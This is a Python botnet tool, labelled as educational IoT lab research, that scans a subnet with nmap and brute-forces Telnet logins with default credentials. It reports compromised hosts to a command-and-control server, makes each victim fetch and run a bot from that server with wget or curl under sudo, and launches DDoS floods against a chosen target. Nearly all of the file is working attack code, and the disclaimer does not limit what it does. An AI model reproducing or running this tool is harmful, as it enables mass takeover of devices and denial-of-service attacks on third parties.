#!/usr/bin/env python3
"""
IoT Security Research - Exploit Script
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import subprocess
import threading
import time
import requests
import json
import logging
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import sys
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exploit.log'),
        logging.StreamHandler()
    ]
)

class IoTExploiter:
    def __init__(self, cnc_server_ip, subnet=None):
        self.cnc_server_ip = cnc_server_ip
        self.cnc_url = f"http://{cnc_server_ip}:5000"
        self.subnet = subnet or "11.10.10.0/24"  # Default IoT lab subnet
        self.credentials = [
            # Default credentials
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("root", "password"),
            # IoT-specific credentials
            ("admin", ""),
            ("root", ""),
            ("admin", "1234"),
            ("root", "1234"),
            ("admin", "admin123"),
            ("root", "root123"),
            ("ipcamadmin", "admin"),
            ("temphumidadmin", "admin"),
            # Common IoT device credentials
            ("admin", "admin1234"),
            ("root", "root1234"),
            ("admin", "adminadmin"),
            ("root", "rootroot"),
            ("admin", "12345678"),
            ("root", "12345678"),
            # Empty credentials
            ("", ""),
            ("admin", None),
            ("root", None)
        ]
        self.compromised_devices = []
        self.scan_results = []
        self.infected_devices = []  # Track infected devices
        
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        logging.info(f"[Exploiter] {message}")
        print(f"[{timestamp}] {message}")
    
    def scan_network(self):
        """Scan network for vulnerable IoT devices using direct nmap command"""
        try:
            self.log(f"Starting network scan on {self.subnet}")

            # Phase 1: Quick scan for active hosts
            self.log("Phase 1: Quick scan for active hosts...")
            result = subprocess.run([
                "nmap", "-sn", self.subnet
            ], capture_output=True, text=True)
            output = result.stdout
            active_hosts = []
            for line in output.splitlines():
                if line.startswith("Nmap scan report for"):
                    ip = line.split()[-1]
                    active_hosts.append(ip)
            if not active_hosts:
                self.log("No active hosts found")
                return []
            self.log(f"Found {len(active_hosts)} active hosts")

            # Phase 2: Detailed scan of active hosts
            self.log("Phase 2: Detailed scan of active hosts...")
            target_ports = "23,80,443,1883,8883,8080"  # Common IoT ports
            vulnerable_hosts = []
            for host in active_hosts:
                result = subprocess.run([
                    "nmap", "-p", target_ports, "-sV", host
                ], capture_output=True, text=True)
                output = result.stdout
                current_ip = host
                for line in output.splitlines():
                    # Example: 23/tcp   open  telnet
                    if "/tcp" in line and "open" in line:
                        parts = line.split()
                        port = int(parts[0].split("/")[0])
                        service = parts[2] if len(parts) > 2 else "unknown"
                        self.log(f"Found open port {port} ({service}) on {current_ip}")
                        vulnerable_hosts.append({
                            'ip': current_ip,
                            'port': port,
                            'service': service
                        })
            # After scan, keep only the latest result per IP
            latest_results = {}
            for device in vulnerable_hosts:
                ip = device['ip']
                latest_results[ip] = device  # Overwrite, so last is latest
            self.scan_results = list(latest_results.values())
            self.log(f"Scan complete. Found {len(self.scan_results)} unique potentially vulnerable devices")
            return self.scan_results
        except Exception as e:
            self.log(f"Error during network scan: {e}")
            return []
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt to login via telnet"""
        try:
            tn = telnetlib.Telnet(host, port, timeout=5)
            
            # Wait for login prompt
            response = tn.read_until(b"login: ", timeout=5)
            if b"login:" not in response:
                response = tn.read_until(b"Username: ", timeout=5)
            
            # Send username
            tn.write(username.encode() + b"\n")
            
            # Wait for password prompt
            response = tn.read_until(b"Password: ", timeout=5)
            if b"Password:" not in response:
                response = tn.read_until(b"password: ", timeout=5)
            
            # Send password
            if password:
                tn.write(password.encode() + b"\n")
            else:
                tn.write(b"\n")
            
            # Check response
            response = tn.read_until(b"$", timeout=5)
            if b"$" in response or b"#" in response or b">" in response:
                return True
            
            return False
            
        except Exception as e:
            return False
        finally:
            try:
                tn.close()
            except:
                pass
    
    def register_compromised_device(self, ip, username, password):
        """Register compromised device with C&C server"""
        try:
            # Add to local list
            self.compromised_devices.append({
                'ip': ip,
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            })
            
            # Register with C&C server
            response = requests.post(
                f"{self.cnc_url}/add-scan-result",
                json={
                    'ip': ip,
                    'port': 23,  # Telnet port
                    'service': 'telnet',
                    'credentials': f"{username}:{password}"
                },
                timeout=5
            )
            
            if response.status_code == 200:
                self.log(f"Successfully registered compromised device {ip}")
                return True
            else:
                self.log(f"Failed to register device {ip} with C&C server")
                return False
                
        except Exception as e:
            self.log(f"Error registering device {ip}: {e}")
            return False
    
    def deploy_bot(self, ip, username, password):
        """Deploy bot to compromised device"""
        try:
            self.log(f"Deploying bot to {ip}")
            
            # Download bot from C&C server
            response = requests.get(f"{self.cnc_url}/download-bot", timeout=10)
            if response.status_code != 200:
                self.log("Failed to download bot from C&C server")
                return False
            
            # Save bot temporarily
            with open('temp_bot.py', 'w') as f:
                f.write(response.text)
            
            # Upload bot to device (simplified for lab environment)
            self.log(f"Bot downloaded successfully. Please manually deploy to {ip}")
            self.log(f"Use credentials: {username}:{password}")
            
            # Clean up
            os.remove('temp_bot.py')
            return True
            
        except Exception as e:
            self.log(f"Error deploying bot to {ip}: {e}")
            return False
    
    def save_results(self):
        """Save scan and exploitation results"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Save scan results
            with open('results/scan_results.json', 'w') as f:
                json.dump(self.scan_results, f, indent=4)
            
            # Save compromised devices
            with open('results/compromised_devices.json', 'w') as f:
                json.dump(self.compromised_devices, f, indent=4)
            
            self.log("Results saved to results/ directory")
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
    
    def infect_devices(self):
        """Infect all compromised devices by downloading and running the bot client via Telnet."""
        if not self.compromised_devices:
            print("No compromised devices available.")
            return
        print("\nInfecting compromised devices...")
        for device in self.compromised_devices:
            ip = device['ip']
            username = device['username']
            password = device['password']
            try:
                tn = telnetlib.Telnet(ip, 23, timeout=10)
                tn.read_until(b"login: ", timeout=5)
                tn.write(username.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=5)
                if password:
                    tn.write(password.encode() + b"\n")
                else:
                    tn.write(b"\n")
                # Wait for shell prompt
                tn.read_until(b"$", timeout=5)
                # Try wget, then curl
                cnc_url = f"http://{self.cnc_server_ip}:5000/download-bot"
                download_cmd = f"wget -O bot_client.py {cnc_url} || curl -o bot_client.py {cnc_url}\n"
                tn.write(download_cmd.encode())
                time.sleep(2)
                # Start the bot in background with sudo
                start_cmd = f"sudo nohup python3 bot_client.py {self.cnc_server_ip} &\n"
                tn.write(start_cmd.encode())
                # Wait for possible sudo password prompt
                response = tn.read_until(b"password", timeout=3)
                if b"password" in response.lower():
                    tn.write((password + "\n").encode())
                # else: no prompt, just continue
                time.sleep(2)
                self.infected_devices.append({
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"Infected {ip} successfully.")
                tn.close()
            except Exception as e:
                print(f"Failed to infect {ip}: {e}")
    
    def view_infected_devices(self):
        """View infected devices."""
        if not self.infected_devices:
            print("No infected devices available.")
        else:
            print("\nInfected Devices:")
            for device in self.infected_devices:
                print(f"IP: {device['ip']}")
                print(f"Credentials: {device['username']}:{device['password']}")
                print(f"Infected at: {device['timestamp']}")
                print("-"*30)
    
    def run_hping3_via_telnet(self, ip, username, password, hping3_cmd):
        """Run hping3 via Telnet, handle sudo password prompt."""
        import telnetlib
        import time
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write((password + "\n").encode())
            tn.read_until(b"$", timeout=5)
            # Send the hping3 command with sudo
            tn.write((hping3_cmd + "\n").encode())
            # Wait for possible sudo password prompt
            response = tn.read_until(b"password", timeout=3)
            if b"password" in response.lower():
                tn.write((password + "\n").encode())
            print(f"Started hping3 on {ip} with command: {hping3_cmd}")
            # Optionally, keep the session open for a while
            time.sleep(5)
            tn.close()
        except Exception as e:
            print(f"Failed to run hping3 on {ip}: {e}")

    def start_ddos_via_c2(self):
        """Start DDoS attack via C2 server API for all infected devices."""
        if not self.infected_devices:
            print("No infected devices available.")
            return
        target_ip = input("Enter target IP to attack: ")
        attack_type = input("Enter attack type (syn/rtsp/mqtt): ")
        for device in self.infected_devices:
            ip = device['ip']
            try:
                response = requests.post(
                    f"{self.cnc_url}/start-attack",
                    json={
                        "bot_ip": ip,
                        "target": target_ip,
                        "attack_type": attack_type
                    },
                    timeout=5
                )
                print(f"C2 server response for {ip}: {response.json()}")
            except Exception as e:
                print(f"Failed to start DDoS via C2 for {ip}: {e}")

    def stop_ddos_via_c2(self):
        """Stop DDoS attack via C2 server API for all infected devices."""
        if not self.infected_devices:
            print("No infected devices available.")
            return
        for device in self.infected_devices:
            ip = device['ip']
            try:
                response = requests.post(
                    f"{self.cnc_url}/stop-attack",
                    json={"bot_ip": ip},
                    timeout=5
                )
                print(f"C2 server response for {ip}: {response.json()}")
            except Exception as e:
                print(f"Failed to stop DDoS via C2 for {ip}: {e}")

    def brute_force_telnet(self):
        """Automatically brute-force all found scan results for Telnet credentials."""
        if not self.scan_results:
            print("No scan results available. Please run a scan first.")
            return
        print("\nBrute-forcing Telnet credentials for all scan results...")
        for target in self.scan_results:
            target_ip = target['ip']
            port = target['port']
            for username, password in self.credentials:
                if self.attempt_telnet_login(target_ip, port, username, password):
                    print(f"Success! {target_ip} Credentials: {username}:{password}")
                    self.register_compromised_device(target_ip, username, password)
                    break
    
    def fetch_scan_results_from_c2(self):
        """Fetch scan results from the C2 server and load into self.scan_results."""
        try:
            response = requests.get(f"{self.cnc_url}/get-scan-results", timeout=5)
            if response.status_code == 200:
                self.scan_results = response.json()
                print(f"Loaded {len(self.scan_results)} scan results from C2 server.")
            else:
                print("Failed to fetch scan results from C2 server.")
        except Exception as e:
            print(f"Error fetching scan results: {e}")

    def interactive_menu(self):
        """Interactive menu for user control"""
        while True:
            print("\n" + "="*50)
            print("IoT Security Research - Exploit Menu")
            print("="*50)
            print("1. Scan network for vulnerable devices")
            print("2. View unique scan results (latest per IP)")
            print("3. Brute-force Telnet credentials on all scan results")
            print("4. View compromised devices (Telnet access)")
            print("5. Infect compromised devices with bot client")
            print("6. View infected devices (bot deployed)")
            print("7. Start DDoS attack from infected devices (via C2)")
            print("8. Stop DDoS attack on infected devices (via C2)")
            print("9. Save results to disk")
            print("10. Exit")
            print("="*50)
            # Always fetch scan results at the start of the menu loop if empty
            if not self.scan_results:
                self.fetch_scan_results_from_c2()
            choice = input("\nEnter your choice (1-10): ")
            if choice == "1":
                self.scan_network()
            elif choice == "2":
                if not self.scan_results:
                    self.fetch_scan_results_from_c2()
                if not self.scan_results:
                    print("No scan results available. Please run a scan first.")
                else:
                    print("\nScan Results (latest per IP):")
                    for device in self.scan_results:
                        print(f"IP: {device['ip']}, Port: {device['port']}, Service: {device['service']}")
            elif choice == "3":
                self.brute_force_telnet()
            elif choice == "4":
                if not self.compromised_devices:
                    print("No compromised devices available.")
                else:
                    print("\nCompromised Devices:")
                    for device in self.compromised_devices:
                        print(f"IP: {device['ip']}")
                        print(f"Credentials: {device['username']}:{device['password']}")
                        print(f"Compromised at: {device['timestamp']}")
                        print("-"*30)
            elif choice == "5":
                self.infect_devices()
            elif choice == "6":
                self.view_infected_devices()
            elif choice == "7":
                self.start_ddos_via_c2()
            elif choice == "8":
                self.stop_ddos_via_c2()
            elif choice == "9":
                self.save_results()
            elif choice == "10":
                print("Exiting...")
                break
            else:
                print("Invalid choice. Please try again.")
            input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()

    # Ping the C&C server before proceeding (robust for Ubuntu/Linux)
    import platform
    import subprocess
    cnc_ip = args.cnc
    print(f"Checking connectivity to C&C server at {cnc_ip}...")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    try:
        result = subprocess.run(['ping', param, '1', cnc_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout.lower()
        if 'ttl=' in output or 'bytes from' in output:
            print(f"C&C server {cnc_ip} is reachable. Starting exploit menu...")
        else:
            print(f"Cannot reach C&C server at {cnc_ip}. Exiting.")
            exit(1)
    except Exception as e:
        print(f"Error pinging C&C server: {e}")
        exit(1)

    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()